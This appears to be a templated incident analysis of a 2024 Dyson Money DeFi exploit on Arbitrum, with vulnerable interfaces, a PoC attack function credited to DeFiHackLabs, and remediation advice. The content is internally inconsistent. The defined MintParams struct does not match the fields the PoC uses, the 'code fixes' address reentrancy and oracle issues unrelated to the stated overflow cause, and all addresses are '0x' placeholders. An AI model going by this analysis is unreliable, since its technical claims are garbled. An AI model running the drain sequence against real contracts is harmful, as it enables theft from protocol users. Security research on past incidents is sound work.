# Dyson Money — Interest Rate Calculation Formula Overflow Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06-20 |
| **Protocol** | Dyson Money |
| **Chain** | Arbitrum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://arbiscan.io/address/0x) |
| **Attack Tx** | [0x](https://arbiscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://arbiscan.io/address/0x) |
| **Root Cause** | Overflow vulnerability in interest rate calculation formula |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Dyson_money_exp.sol) |

---
## 1. Vulnerability Overview

Dyson Money is a DeFi protocol operating on the Arbitrum chain that suffered an **interest rate calculation error** attack on 2024-06-20.
The attacker exploited an overflow vulnerability in the interest rate calculation formula, causing an estimated loss of **unconfirmed** value.

### Key Vulnerability Summary
- **Classification**: Interest rate calculation error
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Overflow vulnerability in interest rate calculation formula
// Attacker exploits this logic to gain illegitimate profit

// Dyson Money interface — interest rate calculation error vulnerable functions
interface Vulncontract {
    struct MintParams {
        address token0;
        address token1;
        uint256 input0;
        uint256 input1;
        uint256 minOutput;
        uint256 time;
    }

    // ❌ Vulnerable: mint's MintParams.time parameter is used directly in interest rate calculation
    // Setting an abnormally large time value causes overflow or extreme interest rates
    // Can result in excessive Dyson token minting or distorted redemption amounts
    function mint(MintParams calldata params) external returns (uint256);

    // ❌ Vulnerable: harvest distributes rewards based on manipulated interest rate
    function harvest() external;

    // ❌ Vulnerable: redeem can return excess assets due to calculation error
    function redeem(address _asset, uint256 _amount) external returns (uint256);
}

interface StableV1AMM {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface DysonVault {
    // ❌ Vulnerable: depositAll/withdrawAll operate on shares calculated with erroneous interest rate
    function depositAll() external;
    function withdrawAll() external;
}

// ✅ Correct implementation: time parameter range validation + overflow prevention
function safeMint(Vulncontract.MintParams calldata params) external returns (uint256) {
    // ✅ Enforce upper bound on time parameter (block abnormally large values)
    require(params.time <= MAX_LOCK_DURATION, "Mint: time exceeds maximum");
    require(params.time >= MIN_LOCK_DURATION, "Mint: time below minimum");
    // ✅ Verify overflow outside unchecked block when calculating interest rate
    uint256 interestRate = calculateRate(params.time);
    require(interestRate <= MAX_INTEREST_RATE, "Mint: interest rate overflow");
    // ✅ minOutput slippage protection
    require(params.minOutput > 0, "Mint: minOutput must be > 0");
    return _executeMint(params, interestRate);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── Dyson Money Contract
  │
  ▼
[Send Malicious Transaction] ─── Call vulnerable function
  │                                (bypass validation)
  ▼
[Drain Assets] ──────────────── Secure profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - Dyson_money_exp.sol
// Chain: Arbitrum | Date: 2024-06-20

    function testExploit() public {
        USDT.approve(address(Router), type(uint256).max);
        attack();
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 18);
    }

    function attack() public {
        approveAll();
        // WBNB_TOKEN.deposit{value: 1.5 ether}();
        Vulncontract.MintParams memory param =
            Vulncontract.MintParams({asset: address(USDC), amount: 901 ether, referral: string("test")});
        b821.mint(param);
        Vulncontract.MintParams memory params =
            Vulncontract.MintParams({asset: address(USDT), amount: 901 ether, referral: string("test")});
        b708.mint(params);

        Usdt.transfer(address(StableV1), 748 ether);
        USDPLUS.transfer(address(StableV1), 900_639_600);

        StableV1.mint(address(this));
        dysonVault.depositAll();

        b29b.harvest();

        dysonVault.withdrawAll();

        uint256 amounts = StableV1.balanceOf(address(this));
        StableV1.transfer(address(StableV1), amounts);
        StableV1.burn(address(this));
        b708.redeem(address(USDT), 15_000 ether);
        b821.redeem(address(USDC), 18_000 * 1e6);
    }

    function approveAll() internal {
        USDT.approve(address(b708), type(uint256).max);
        Usdt.approve(address(b708), type(uint256).max);
        USDC.approve(address(b821), type(uint256).max);
        USDPLUS.approve(address(b821), type(uint256).max);
        StableV1.approve(address(dysonVault), type(uint256).max);
    }
}

```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criterion | Details |
|-----------|------|
| **DASP Top 10** | Logic vulnerability |
| **Attack Type** | Smart contract bug |
| **Vulnerability Category** | DeFi attack |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to affected functions
2. **Assess damage**: Quantify lost assets and classify affected users
3. **Notify relevant parties**: Immediately alert related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Operate a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Interest rate calculation error attacks are preventable**: Proper validation and pattern application can defend against them
2. **Consider economic incentives**: All functions must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem at Large
- The **2024-06-20** Dyson Money incident reconfirms the danger of **interest rate calculation error** attacks in the Arbitrum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Dyson_money_exp.sol)*